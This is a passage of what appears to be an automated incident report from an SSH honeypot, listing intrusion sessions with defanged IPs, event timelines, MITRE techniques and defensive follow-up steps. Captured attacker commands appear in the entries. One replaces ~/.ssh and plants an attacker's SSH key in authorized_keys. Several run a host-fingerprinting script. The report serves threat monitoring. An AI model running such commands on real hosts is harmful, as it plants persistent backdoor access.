| `2026-07-11 06:19:05` | `cowrie.login.success` |
| `2026-07-11 06:19:06` | `cowrie.session.params` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.success` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.command.input` |
| `2026-07-11 06:19:06` | `cowrie.log.closed` |
| `2026-07-11 06:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8dddec2d946

| Field | Detail |
|---|---|
| **Source IP** | `207.175.50[.]16` |
| **First Seen** | 2026-07-11 06:19 |
| **Last Seen** | 2026-07-11 06:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:19:08` | `cowrie.session.connect` |
| `2026-07-11 06:19:08` | `cowrie.login.success` |
| `2026-07-11 06:19:08` | `cowrie.session.params` |
| `2026-07-11 06:19:08` | `cowrie.command.input` |
| `2026-07-11 06:19:08` | `cowrie.command.failed` |
| `2026-07-11 06:19:15` | `cowrie.log.closed` |
| `2026-07-11 06:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.50[.]16` to AbuseIPDB if not already reported
- [ ] Block `207.175.50[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b1259dcb1b

| Field | Detail |
|---|---|
| **Source IP** | `207.175.50[.]16` |
| **First Seen** | 2026-07-11 06:19 |
| **Last Seen** | 2026-07-11 06:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:19:10` | `cowrie.session.connect` |
| `2026-07-11 06:19:10` | `cowrie.login.success` |
| `2026-07-11 06:19:10` | `cowrie.session.params` |
| `2026-07-11 06:19:10` | `cowrie.command.input` |
| `2026-07-11 06:19:15` | `cowrie.log.closed` |
| `2026-07-11 06:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.50[.]16` to AbuseIPDB if not already reported
- [ ] Block `207.175.50[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1774ca76bf9

| Field | Detail |
|---|---|
| **Source IP** | `125.72.150[.]250` |
| **First Seen** | 2026-07-11 06:19 |
| **Last Seen** | 2026-07-11 06:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:19:39` | `cowrie.session.connect` |
| `2026-07-11 06:19:41` | `cowrie.client.version` |
| `2026-07-11 06:19:41` | `cowrie.client.kex` |
| `2026-07-11 06:19:45` | `cowrie.login.success` |
| `2026-07-11 06:19:45` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.72.150[.]250` to AbuseIPDB if not already reported
- [ ] Block `125.72.150[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fff807dbc94

| Field | Detail |
|---|---|
| **Source IP** | `103.230.176[.]152` |
| **First Seen** | 2026-07-11 06:19 |
| **Last Seen** | 2026-07-11 06:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:19:55` | `cowrie.session.connect` |
| `2026-07-11 06:19:56` | `cowrie.client.version` |
| `2026-07-11 06:19:56` | `cowrie.client.kex` |
| `2026-07-11 06:19:58` | `cowrie.login.success` |
| `2026-07-11 06:19:59` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.230.176[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.230.176[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650fc1e71d6f

| Field | Detail |
|---|---|
| **Source IP** | `166.148.146[.]247` |
| **First Seen** | 2026-07-11 06:20 |
| **Last Seen** | 2026-07-11 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:20:05` | `cowrie.session.connect` |
| `2026-07-11 06:20:05` | `cowrie.client.version` |
| `2026-07-11 06:20:05` | `cowrie.client.kex` |
| `2026-07-11 06:20:06` | `cowrie.login.success` |
| `2026-07-11 06:20:06` | `cowrie.session.params` |
| `2026-07-11 06:20:06` | `cowrie.command.input` |
| `2026-07-11 06:20:06` | `cowrie.command.failed` |
| `2026-07-11 06:20:07` | `cowrie.log.closed` |
| `2026-07-11 06:20:07` | `cowrie.session.params` |
| `2026-07-11 06:20:07` | `cowrie.command.input` |
| `2026-07-11 06:20:07` | `cowrie.session.file_download` |
| `2026-07-11 06:20:07` | `cowrie.log.closed` |
| `2026-07-11 06:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.148.146[.]247` to AbuseIPDB if not already reported
- [ ] Block `166.148.146[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d61a8b02449

| Field | Detail |
|---|---|
| **Source IP** | `166.148.146[.]247` |
| **First Seen** | 2026-07-11 06:20 |
| **Last Seen** | 2026-07-11 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:20:08` | `cowrie.session.connect` |
| `2026-07-11 06:20:08` | `cowrie.client.version` |
| `2026-07-11 06:20:08` | `cowrie.client.kex` |
| `2026-07-11 06:20:08` | `cowrie.login.success` |
| `2026-07-11 06:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.148.146[.]247` to AbuseIPDB if not already reported
- [ ] Block `166.148.146[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315403f42037

| Field | Detail |
|---|---|
| **Source IP** | `166.148.146[.]247` |
| **First Seen** | 2026-07-11 06:20 |
| **Last Seen** | 2026-07-11 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:20:08` | `cowrie.session.connect` |
| `2026-07-11 06:20:08` | `cowrie.client.version` |
| `2026-07-11 06:20:08` | `cowrie.client.kex` |
| `2026-07-11 06:20:09` | `cowrie.login.success` |
| `2026-07-11 06:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.148.146[.]247` to AbuseIPDB if not already reported
- [ ] Block `166.148.146[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934567fc2199

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:21 |
| **Last Seen** | 2026-07-11 06:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:21:11` | `cowrie.session.connect` |
| `2026-07-11 06:21:11` | `cowrie.client.version` |
| `2026-07-11 06:21:11` | `cowrie.client.kex` |
| `2026-07-11 06:21:12` | `cowrie.login.success` |
| `2026-07-11 06:21:13` | `cowrie.session.params` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.success` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.command.input` |
| `2026-07-11 06:21:13` | `cowrie.log.closed` |
| `2026-07-11 06:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957757a16719

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:23 |
| **Last Seen** | 2026-07-11 06:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:23:11` | `cowrie.session.connect` |
| `2026-07-11 06:23:11` | `cowrie.client.version` |
| `2026-07-11 06:23:11` | `cowrie.client.kex` |
| `2026-07-11 06:23:12` | `cowrie.login.success` |
| `2026-07-11 06:23:13` | `cowrie.session.params` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.success` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.command.input` |
| `2026-07-11 06:23:13` | `cowrie.log.closed` |
| `2026-07-11 06:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941ce8702ddf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:25 |
| **Last Seen** | 2026-07-11 06:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:25:03` | `cowrie.session.connect` |
| `2026-07-11 06:25:03` | `cowrie.client.version` |
| `2026-07-11 06:25:03` | `cowrie.client.kex` |
| `2026-07-11 06:25:03` | `cowrie.login.success` |
| `2026-07-11 06:25:04` | `cowrie.session.params` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.success` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:04` | `cowrie.command.input` |
| `2026-07-11 06:25:05` | `cowrie.log.closed` |
| `2026-07-11 06:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3fe3b06caa8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:26 |
| **Last Seen** | 2026-07-11 06:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:26:49` | `cowrie.session.connect` |
| `2026-07-11 06:26:49` | `cowrie.client.version` |
| `2026-07-11 06:26:49` | `cowrie.client.kex` |
| `2026-07-11 06:26:50` | `cowrie.login.success` |
| `2026-07-11 06:26:51` | `cowrie.session.params` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.success` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.command.input` |
| `2026-07-11 06:26:51` | `cowrie.log.closed` |
| `2026-07-11 06:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253642c06b72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:28 |
| **Last Seen** | 2026-07-11 06:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:28:39` | `cowrie.session.connect` |
| `2026-07-11 06:28:40` | `cowrie.client.version` |
| `2026-07-11 06:28:40` | `cowrie.client.kex` |
| `2026-07-11 06:28:40` | `cowrie.login.success` |
| `2026-07-11 06:28:41` | `cowrie.session.params` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.success` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.command.input` |
| `2026-07-11 06:28:41` | `cowrie.log.closed` |
| `2026-07-11 06:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2e67ff4e60

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 06:29 |
| **Last Seen** | 2026-07-11 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:29:39` | `cowrie.session.connect` |
| `2026-07-11 06:29:39` | `cowrie.client.version` |
| `2026-07-11 06:29:39` | `cowrie.client.kex` |
| `2026-07-11 06:29:39` | `cowrie.login.success` |
| `2026-07-11 06:29:40` | `cowrie.session.params` |
| `2026-07-11 06:29:40` | `cowrie.command.input` |
| `2026-07-11 06:29:40` | `cowrie.log.closed` |
| `2026-07-11 06:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d316a41ff036

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:30 |
| **Last Seen** | 2026-07-11 06:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:30:27` | `cowrie.session.connect` |
| `2026-07-11 06:30:27` | `cowrie.client.version` |
| `2026-07-11 06:30:27` | `cowrie.client.kex` |
| `2026-07-11 06:30:28` | `cowrie.login.success` |
| `2026-07-11 06:30:29` | `cowrie.session.params` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.success` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.command.input` |
| `2026-07-11 06:30:29` | `cowrie.log.closed` |
| `2026-07-11 06:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6236537dda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:32 |
| **Last Seen** | 2026-07-11 06:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:32:11` | `cowrie.session.connect` |
| `2026-07-11 06:32:11` | `cowrie.client.version` |
| `2026-07-11 06:32:11` | `cowrie.client.kex` |
| `2026-07-11 06:32:11` | `cowrie.login.success` |
| `2026-07-11 06:32:12` | `cowrie.session.params` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.success` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:12` | `cowrie.command.input` |
| `2026-07-11 06:32:13` | `cowrie.log.closed` |
| `2026-07-11 06:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40de55675d69

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-11 06:33 |
| **Last Seen** | 2026-07-11 06:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:33:19` | `cowrie.session.connect` |
| `2026-07-11 06:33:20` | `cowrie.client.version` |
| `2026-07-11 06:33:20` | `cowrie.client.kex` |
| `2026-07-11 06:33:21` | `cowrie.login.success` |
| `2026-07-11 06:33:21` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441f5c326cc4

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-11 06:33 |
| **Last Seen** | 2026-07-11 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:33:21` | `cowrie.session.connect` |
| `2026-07-11 06:33:21` | `cowrie.client.version` |
